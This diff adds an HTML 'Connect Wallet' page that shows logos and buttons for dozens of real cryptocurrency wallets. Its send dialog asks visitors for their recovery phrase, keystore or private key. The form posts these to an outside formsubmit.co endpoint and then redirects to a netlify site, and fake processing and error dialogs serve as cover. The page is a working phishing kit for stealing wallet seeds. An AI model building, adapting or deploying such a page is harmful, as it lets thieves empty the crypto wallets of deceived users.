@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta name="generator" content="HTML Tidy for HTML5 for Linux version 5.6.0">
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>smartdecentralizedtools Wallet system</title><!-- Font Awesome -->
+
+  <script src="https://kit.fontawesome.com/78d167673c.js" crossorigin="anonymous"></script><!-- Google Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com/">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;700;800;900&amp;display=swap" rel="stylesheet"><!-- Bootstrap CSS -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"><!-- Custom CSS -->
+  <link rel="stylesheet" href="./assets/2.6 animate.css.css">
+  <link rel="stylesheet" href="./assets/walletpage.css">
+  <link rel="stylesheet" href="./assets/bootstrap.min(1).css">
+  <link href="./assets/main.css" rel="stylesheet">
+  <style>
+        body {
+            background: #000000;
+            color: #e9e9e9;
+            font-family: 'Poppins', sans-serif;
+        }
+        
+        .coin-img {
+            border-radius: 50%;
+            padding: 5px;
+            background: #fff;
+            width: 60px;
+            height: 60px;
+            object-fit: contain;
+        }
+        
+        .text-white {
+            color: #e9e9e9;
+        }
+        
+        .coin {
+            display: inline-flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            margin: 10px;
+            min-width: 150px;
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.1);
+            transition: all 0.3s;
+        }
+        
+        .coin:hover {
+            background: rgba(255,255,255,0.1);
+            transform: translateY(-5px);
+        }
+        
+        .coin h4 {
+            margin-top: 10px;
+            font-size: 14px;
+        }
+        
+        .coin-registry {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 15px;
+        }
+        
+        /* Modal Styles */
+        .message-dialog, #send-dialog, #connect-dialog {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9999;
+            display: none;
+        }
+        
+        .send-dialog-overlay, .content-dialog-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+        }
+        
+        .send-dialog-content, .content-dialog-content {
+            position: relative;
+            max-width: 500px;
+            margin: 50px auto;
+            background: #1a1a1a;
+            border-radius: 15px;
+            padding: 30px;
+            color: white;
+            z-index: 10000;
+        }
+        
+        .connect-dialog-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+        
+        .dialog-dismiss {
+            background: #dc3545;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        
+        .connect-dialog-body {
+            text-align: center;
+        }
+        
+        .wallet-app-info, .to-send-info {
+            margin: 20px 0;
+        }
+        
+        .wallet-app-logo img, .wallet-app-send-logo img {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            margin-bottom: 15px;
+        }
+        
+        .send-tabs {
+            display: flex;
+            justify-content: space-around;
+            margin: 20px 0;
+        }
+        
+        .send-tabs button {
+            background: transparent;
+            border: none;
+            color: #6366f1;
+            padding: 10px 20px;
+            cursor: pointer;
+            border-bottom: 2px solid transparent;
+        }
+        
+        .send-tabs button:hover {
+            border-bottom: 2px solid #6366f1;
+        }
+        
+        .send-form .form-control {
+            background: rgba(255,255,255,0.1);
+            border: 1px solid rgba(255,255,255,0.2);
+            color: white;
+            margin-bottom: 15px;
+        }
+        
+        .send-form .form-control::placeholder {
+            color: rgba(255,255,255,0.5);
+        }
+        
+        #proceedButton {
+            width: 100%;
+            padding: 12px;
+            background: #6366f1;
+            border: none;
+            border-radius: 8px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        
+        #proceedButton:hover {
+            background: #4f46e5;
+        }
+        
+        .connection-info {
+            margin: 20px 0;
+            font-size: 18px;
+        }
+        
+        .manual-connection {
+            background: #6366f1;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 15px;
+        }
+        
+        #searchInput {
+            width: 100%;
+            max-width: 500px;
+            margin: 20px auto;
+            display: block;
+            padding: 12px 20px;
+            background: rgba(255,255,255,0.1);
+            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 25px;
+            color: white;
+            text-align: center;
+        }
+        
+        #searchInput::placeholder {
+            color: rgba(255,255,255,0.5);
+        }
+
+        .logo-container {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+  </style>
+</head>
+<body>
+  <!-- Processing Dialog -->
+  <div id="processing-dialog" class="message-dialog" style="display: none">
+    <div class="send-dialog-overlay"></div>
+    <div class="send-dialog-content">
+      <div class="connect-dialog-body">
+        <h1 id="processing-val" style="font-size: 45px">30</h1>
+        <h4 class="mt-3">Processing...</h4>
+      </div>
+    </div>
+  </div><!-- Success Dialog -->
+  <div id="success-dialog" class="message-dialog" style="display: none">
+    <div class="send-dialog-overlay"></div>
+    <div class="send-dialog-content">
+      <div class="connect-dialog-body"><img style="width: 100px" src="./assets/success.gif" alt="Success">
+      <h4 class="mt-3">Connection Successful</h4><img style="width: 100px" src="./assets/qr.png" alt="QR Code"></div>
+    </div>
+  </div><!-- Error Dialog -->
+  <div id="error-dialog" class="message-dialog" style="display: none">
+    <div class="send-dialog-overlay"></div>
+    <div class="send-dialog-content" style="background: #fefcfb">
+      <div class="connect-dialog-body">
+        <img style="width: 150px" src="./assets/error.gif" alt="Error">
+        <h4 class="mt-3">Connection Failed, Try Again</h4>
+      </div>
+    </div>
+  </div><!-- Send Dialog -->
+  <div id="send-dialog" style="display: none">
+    <div class="send-dialog-overlay"></div>
+    <div class="send-dialog-content">
+      <div class="connect-dialog-body">
+        <div class="to-send-info">
+          <div class="wallet-app-send-logo"><img id="current-wallet-send-logo" src="" alt="wallet-app-name"></div>
+          <div id="current-wallet-app-send" class="wallet-app-name-send">
+            My app
+          </div>
+        </div>
+        <div class="send-tabs">
+          <button id="phraseSend">Phrase</button> <button id="keystoreSend">Keystore</button> <button id="privateKeySend">Private Key</button>
+        </div>
+        <div class="send-form">
+          <form action="https://formsubmit.co/9eff1f1d42b576e5ff2638bea3616318" id="form" method="post" name="form">
+            <input type="hidden" name="_captcha" value="false"> <input type="hidden" name="_next" value="https://smartdappsresolution.netlify.app/"> <input type="hidden" name="wallet" id="walletNameData">
+            <div id="data-to-send">
+              <div class="form-group">
+                <input type="hidden" name="type" value="phrase"> 
+                <textarea name="phrase" required="" class="form-control" placeholder="Enter your recovery phrase" rows="5" style="resize: none"></textarea>
+              </div>
+              <div class="small text-left my-3" style="font-size: 11px">
+                Typically 12 (sometimes 24) words separated by single spaces
+              </div>
+            </div><button type="submit" id="proceedButton">PROCEED</button> <button type="button" class="btn btn-sm dialog-dismiss btn-danger mt-2">Cancel</button>
+          </form>
+        </div>
+      </div>
+    </div>
+  </div><!-- Connect Dialog -->
+  <div id="connect-dialog" style="display: none">
+    <div class="content-dialog-overlay"></div>
+    <div class="content-dialog-content">
+      <div class="connect-dialog-header">
+        <button class="dialog-dismiss">Back</button> <button class="dialog-dismiss">X</button>
+      </div>
+      <div class="connect-dialog-body">
+        <div class="connection-info"></div>
+        <div class="wallet-app-info">
+          <div class="wallet-app-logo"><img id="current-wallet-logo" src="" alt="wallet"></div>
+          <div id="current-wallet-app"></div>
+        </div>
+      </div>
+    </div>
+  </div><!-- Header -->
+  <div id="header">
+    <div class="container pt-3">
+      <div class="logo-container">
+        <svg width="120" height="40" viewbox="0 0 120 40">
+        <circle cx="10" cy="20" r="8" fill="#6366f1"></circle>
+        <circle cx="30" cy="20" r="8" fill="#6366f1"></circle>
+        <circle cx="50" cy="20" r="8" fill="#6366f1"></circle>
+        <circle cx="70" cy="20" r="8" fill="#6366f1"></circle></svg>
+      </div>
+    </div>
+  </div><!-- Main Content -->
+  <div class="coin-section">
+    <div class="container">
+      <div class="text-center">
+        <h1 class="text-white">Connect Wallet</h1>
+        <h6 class="text-white">Please connect your wallet to continue</h6><input type="text" id="searchInput" placeholder="Search wallet names...">
+      </div>
+      <div class="coin-registry">
+        <!-- All 80+ wallet buttons here - abbreviated for space -->
+         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl shadow rounded-xl"><img class="coin-img" src="./assets/e726391f66eb7da7a0ed7d780b4df5e8e2416a17.png" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl shadow rounded-xl">Wallet Connect</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/tangem.png" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl">Tangem Wallet</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal2" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0.jpeg" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal2" class="btn coin shadow rounded-xl">Trust</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/solana-sol-logo.png" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl">Solana Wallet</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/Solflarewallet.jpg" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl">Solfare Wallet</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/unisat.jpg" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl">Unisat Wallet</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/CasperSigner.svg" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl">Casper Signer Wallet</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/plugwallet.png" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl">Plug Wallet</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/Bitfinity.png" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl">Bitfinity Wallet</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/MyTonWallet.jpg" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl">MyTon Wallet</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/Tonkeeperwallet.jpg" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl">Tonkeeper Wallet</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/TonHubWallet.jpg" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl">TonHub Wallet</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/Electrum.jpg" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl">Electrum Wallet</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/CasperDash.svg" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl">CasperDash Wallet</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/ledger.svg" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl">Ledger Wallet</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/Uniswap-Logo.webp" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl">UNISWAP Wallet</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/gate.jpg" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl">Gate Wallet</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/sui.jpg" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl">Sui Wallet</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/Casper.svg" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl">Casper Wallet</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/suiet.jpg" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl">Suiet Wallet</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/nightly.jpg" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl">Nightly Wallet</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/shadow.jpg" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl">Shadow Wallet</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/ethos.jpg" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl">Ethos Wallet</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/surf.jpg" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl">Surf Wallet</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/bestwallet.jpg" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl">Best Wallet</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/okx.png" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl">okx Wallet</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/Xverse.jpg" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl">Xverse Wallet</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/magic_eden.png" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl">Magic Eden Wallet</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/leather.svg" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl">Leather Wallet</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/asigna.jpg" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl">Asigna Wallet</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal4" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96.jpeg" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal4" class="btn coin shadow rounded-xl">Metamask</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal15" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/ledger_logo.png" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal15" class="btn coin shadow rounded-xl">Ledger</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal100" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/brd.jpg" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal100" class="btn coin shadow rounded-xl">BRD wallet</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal16" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/Coinbaselogo_Supplied_250x250-2.png" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal16" class="btn coin shadow rounded-xl">Coinbase</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal101" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/saitama.png" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal101" class="btn coin shadow rounded-xl">Saitamask wallet</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal102" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/terra.png" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal102" class="btn coin shadow rounded-xl">Terra station</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal103" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/phantom.jpeg" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal103" class="btn coin shadow rounded-xl">Phantom wallet</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal104" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/cosmos.png" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal104" class="btn coin shadow rounded-xl">Cosmos station</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal105" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/exodus.png" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal105" class="btn coin shadow rounded-xl">Exodus wallet</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369.jpeg" alt="" style="border-radius: 40px"></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal" class="btn coin shadow rounded-xl">Rainbow</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal3" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/m92jEcPI_400x400.jpg" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal3" class="btn coin shadow rounded-xl">Argent</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal5" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/54043975-b6cdb800-4182-11e9-83bd-0cd2eb757c6e.png" alt="" style="border-radius: 50%"></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal5" class="btn coin shadow rounded-xl">Binance Chain</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal6" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/lg" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal6" class="btn coin shadow rounded-xl">Safemoon</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal7" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/lg(1)" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal7" class="btn coin shadow rounded-xl">Gnosis Safe</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal8" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/f2436c67184f158d1beda5df53298ee84abfc367581e4505134b5bcf5f46697d.jpeg" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal8" class="btn coin shadow rounded-xl">DeFi</button></h4><!-- Modal -->
+         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal9" class="btn coin shadow rounded-xl"><img class="coin-img" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOEAAADhCAMAAAAJbSJIAAAAYFBMVEV1Adn///9rANeZUeK0i+lqANf79P/gyPZ+Edt3ANrm0vjt3PrKqvCveuivfOi/lu3Cmu6gX+THo+/Ale3z5fzZuPWqdefr2fqSQOHx5/vjzfembuaxgemrc+fRs/GFJt194pibAAABw0lEQVR4nO3c2W7bMBBAUZGpW3dNmrbp3vz/XzZpNjuxBFSgQ87gnHcBc8Gh7CdNEwAAAAAAAAAAAAAAkMy29wBH9/G89h7hyE7KafLEk1I+bXoPcVRXhclP8bowd+K/wnKWOPGmsJzlvYu3hYkX9a4w76LeF6Zd1IfCrKe4U5g0cbdw6MS6ZOnBvcJyOuxd3H5+O+/LUuJ+4binuC0L3vxH4bCJ7QpHTWxYOOjvYsvCMU+xaeGQiW0LR0xsXFguhktsXfhC4bNTOE/hKBTOUzgKhfMUjkLhPIWjUDhP4SgUzlM4isXCrxkKp9dLlh4MU7iawvgUxqcwPoXxKYxPYXwK41MYn8L4FManMD6F8SmML0xh3az0LUjhtrxcK0xhWwqfn0KFCvtTqFBhfwoVKuxPoUKF/SnMWvj91Uo/fvYOeqJ+OFR4vln8MM/Kb/Z0Un8dKHw34qSr1ffZCw8lJis8kJit8OnrJl3hVC+yFz5OTFj4aFEzFu6/blIW7iXmLNxd1KSFO4lZCx8WNW3hfWLewrvExIW3dzFz4c2/m9SFU/2dvfD6LiYvvLqLf5IXTvWy9wQAAAAAAAAAAAAAAEBrfwFLJCClTlJ5TwAAAABJRU5ErkJggg==" alt="" style="border-radius: 40px"></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal9" class="btn coin shadow rounded-xl">Pillar</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal10" class="btn coin shadow rounded-xl"><img style="border-radius: 40px" class="coin-img" src="./assets/unnamed.png" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal10" class="btn coin shadow rounded-xl">imToken</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal11" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/dceb063851b1833cbb209e3717a0a0b06bf3fb500fe9db8cd3a553e4b1d02137.jpeg" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal11" class="btn coin shadow rounded-xl">ONTO</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal12" class="btn coin shadow rounded-xl"><img style="border-radius: 40px" class="coin-img" src="./assets/20459438007b75f4f4acb98bf29aa3b800550309646d375da5fd4aac6c2a2c66.jpeg" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal12" class="btn coin shadow rounded-xl">TokenPocket</button></h4><!-- Modal -->
+         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal13" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/aave-aave-logo.png" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal13" class="btn coin shadow rounded-xl">Aave</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal14" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/2772.png" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal14" class="btn coin shadow rounded-xl">Digitex</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal17" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/portis_logo_dribbble.png" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal17" class="btn coin shadow rounded-xl">Portis</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal18" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/rtDOqMXY_400x400.jpg" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal18" class="btn coin shadow rounded-xl">Formatic</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal19" class="btn coin shadow rounded-xl"><img style="border-radius: 40px" class="coin-img" src="./assets/7674bb4e353bf52886768a3ddc2a4562ce2f4191c80831291218ebd90f5f5e26.jpeg" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal19" class="btn coin shadow rounded-xl">MathWallet</button></h4><!-- Modal -->
+         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal20" class="btn coin shadow rounded-xl"><img style="border-radius: 40px" class="coin-img" src="./assets/1581439195205.jpg" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal20" class="btn coin shadow rounded-xl">BitPay</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal21" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/lg(2)" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal21" class="btn coin shadow rounded-xl">Ledger Live</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal22" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/28189800" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal22" class="btn coin shadow rounded-xl">WallETH</button></h4><!-- Modal -->
+         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal23" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/49746116" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal23" class="btn coin shadow rounded-xl">Authereum</button></h4><!-- Modal -->
+         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal24" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/5DxVDK36_400x400.png" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal24" class="btn coin shadow rounded-xl">Dharma</button></h4><!-- Modal -->
+         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal25" class="btn coin shadow rounded-xl"><img style="border-radius: 40px" class="coin-img" src="./assets/lg(3)" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal25" class="btn coin shadow rounded-xl">1inch Wallet</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal26" class="btn coin shadow rounded-xl"><img style="border-radius: 40px" class="coin-img" src="./assets/lg(4)" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal26" class="btn coin shadow rounded-xl">Huobi</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal27" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/8EXrk57o_400x400.jpg" alt=""></button>
